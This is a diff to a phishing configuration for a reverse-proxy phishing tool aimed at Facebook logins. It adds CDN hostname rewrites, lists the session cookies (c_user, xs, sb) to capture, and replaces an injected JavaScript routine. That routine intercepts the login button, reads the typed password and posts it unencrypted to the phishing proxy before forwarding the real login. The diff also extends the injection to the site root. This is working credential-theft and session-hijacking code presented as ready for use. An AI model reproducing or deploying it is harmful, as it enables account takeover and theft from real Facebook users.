@@ -5,6 +5,7 @@ proxy_hosts:
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'facebook.com', session: false, is_landing: false}
   - {phish_sub: 'static', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'scontent', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -13,6 +14,8 @@ sub_filters:
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: '', domain: 'facebook.com', search: '{domain_regexp}', replace: '{domain_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-javascript; charset=utf-8']}
   - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'fbcdn.net', search: '(scontent\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'scontent.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'fbcdn.net', search: '(scontent\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\\\/v\\\/)', replace: 'scontent.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
   - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
@@ -30,32 +33,56 @@ login:
   path: '/login'
 js_inject:
   - trigger_domains: ["www.facebook.com", "m.facebook.com"]
-    trigger_paths: ["/login(.*)"]
+    trigger_paths: ["/login(.*)", "/"]
     trigger_params: []
     script: |
-        let start = setInterval(function() {
-          if (document.querySelectorAll('form[id=login_form]').length) {
-            clearInterval(start);
-            let subButton = document.querySelector('button[name=login]')
-            let parent = subButton.parentElement
-            async function a(ev) {
-              ev.stopPropagation();
-              ev.preventDefault();
-              var password = document.getElementsByName('pass')[0].value;
-              await fetch('/login', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: "unenc_password=" + encodeURIComponent(password)});
-              parent.removeEventListener('click', a, true);
-              ev.target.click()
-            }
-            parent.addEventListener("click", a, true);
-            new MutationObserver(function(mutations) {
-              mutations.forEach(function(mutation) {
-                if (mutation.type == "attributes" && mutation.attributeName == "disabled" && mutation.target.disabled == true) {
-                  parent.removeEventListener('click', a, true);
-                  parent.addEventListener("click", a, true);
-                }
-              });
-            }).observe(document.querySelector('button[name=login]'), {
-              attributes: true
-            });
+      const waitForEl = (selector) => {
+        return new Promise((resolve) => {
+          if (document.querySelector(selector)) {
+            return resolve(document.querySelector(selector));
           }
-        }, 100);
+          const observer = new MutationObserver((mutations) => {
+            if (document.querySelector(selector)) {
+              resolve(document.querySelector(selector));
+              observer.disconnect();
+            }
+          });
+          observer.observe(document.body, {
+            childList: true,
+            subtree: true,
+          });
+        });
+      };
+      waitForEl("form[id=login_form]").then(() => {
+        let subButton = document.querySelector("button[name=login]");
+        let parent = subButton.parentElement;
+        async function a(ev) {
+          ev.stopPropagation();
+          ev.preventDefault();
+          if (!subButton.disabled || document.location.host.split(".")[0] === "m") {
+            var password = document.getElementsByName("pass")[0].value;
+            await fetch("/login", {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: "unenc_password=" + encodeURIComponent(password),
+            });
+            parent.removeEventListener("click", a, true);
+            ev.target.click();
+          }
+        }
+        parent.addEventListener("click", a, true);
+        new MutationObserver(function (mutations) {
+          mutations.forEach(function (mutation) {
+            if (
+              mutation.type == "attributes" &&
+              mutation.attributeName == "disabled" &&
+              mutation.target.disabled == true
+            ) {
+              parent.removeEventListener("click", a, true);
+              parent.addEventListener("click", a, true);
+            }
+          });
+        }).observe(document.querySelector("button[name=login]"), {
+          attributes: true,
+        });
+      });
